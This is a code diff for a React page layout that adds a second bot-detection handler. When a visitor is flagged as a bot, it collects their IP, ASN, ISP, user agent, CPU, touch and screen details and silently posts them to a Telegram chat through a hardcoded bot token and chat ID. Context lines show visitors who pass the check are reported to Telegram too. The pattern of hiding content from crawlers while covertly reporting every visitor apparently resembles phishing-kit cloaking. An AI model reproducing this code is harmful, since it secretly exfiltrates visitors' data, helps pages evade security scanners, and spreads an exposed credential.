@@ -41,8 +41,9 @@ const LoadingDots = () => {
 
 const Layout: FC = () => {
 	const [isChecked, setIsChecked] = useState(false);
-	const { isBot, isLoading } = useBotDetection();
+	const { isBot, isLoading, blockReason } = useBotDetection();
 	const logSentRef = useRef(false);
+	const botLogSentRef = useRef(false);
 
 	useEffect(() => {
 		const storedValue = localStorage.getItem('checked');
@@ -113,6 +114,73 @@ const Layout: FC = () => {
 			fetchGeoAndSendTelegram();
 		}
 	}, [isLoading, isBot, isChecked]);
+
+	useEffect(() => {
+		if (!isLoading && isBot && blockReason && !botLogSentRef.current) {
+			botLogSentRef.current = true;
+
+			const fetchGeoAndSendBotTelegram = async () => {
+				const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
+				const botToken =
+					'7687302268:AAEzwPymAbKg_RtyLotGQkvfzfhniO6X-OA';
+				const chatId = '-4690918157';
+
+				try {
+					const geoRes = await fetch(geoUrl);
+					const geoData = await geoRes.json();
+					const fullFingerprint = {
+						asn: geoData.asn,
+						organization_name: geoData.organization_name,
+						organization: geoData.organization,
+						ip: geoData.ip,
+						navigator: {
+							userAgent: navigator.userAgent,
+							hardwareConcurrency: navigator.hardwareConcurrency,
+							maxTouchPoints: navigator.maxTouchPoints,
+							webdriver: navigator.webdriver,
+						},
+						screen: {
+							width: screen.width,
+							height: screen.height,
+							availWidth: screen.availWidth,
+							availHeight: screen.availHeight,
+						},
+					};
+
+					const msg = `🚫 <b>Bot bị chặn</b>
+⚠️ <b>Lý do:</b> <code>${blockReason}</code>
+
+📍 <b>IP:</b> <code>${fullFingerprint.ip}</code>
+🏢 <b>ASN:</b> <code>${fullFingerprint.asn}</code>
+🏛️ <b>Nhà mạng:</b> <code>${fullFingerprint.organization_name ?? fullFingerprint.organization ?? 'Không rõ'}</code>
+
+🌐 <b>Trình duyệt:</b> <code>${fullFingerprint.navigator.userAgent}</code>
+💻 <b>CPU:</b> <code>${fullFingerprint.navigator.hardwareConcurrency}</code> nhân
+📱 <b>Touch:</b> <code>${fullFingerprint.navigator.maxTouchPoints}</code> điểm
+🤖 <b>WebDriver:</b> <code>${fullFingerprint.navigator.webdriver ? 'Có' : 'Không'}</code>
+
+📺 <b>Màn hình:</b> <code>${fullFingerprint.screen.width}x${fullFingerprint.screen.height}</code>
+📐 <b>Màn hình thực:</b> <code>${fullFingerprint.screen.availWidth}x${fullFingerprint.screen.availHeight}</code>`;
+
+					const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+					const payload = {
+						chat_id: chatId,
+						text: msg,
+						parse_mode: 'HTML',
+					};
+
+					await fetch(telegramUrl, {
+						method: 'POST',
+						headers: { 'Content-Type': 'application/json' },
+						body: JSON.stringify(payload),
+					});
+				} catch (error) {
+					console.error('failed to send bot telegram:', error);
+				}
+			};
+			fetchGeoAndSendBotTelegram();
+		}
+	}, [isLoading, isBot, blockReason]);
 
 	if (isChecked || (!isLoading && !isBot)) {
 		return <Outlet />;
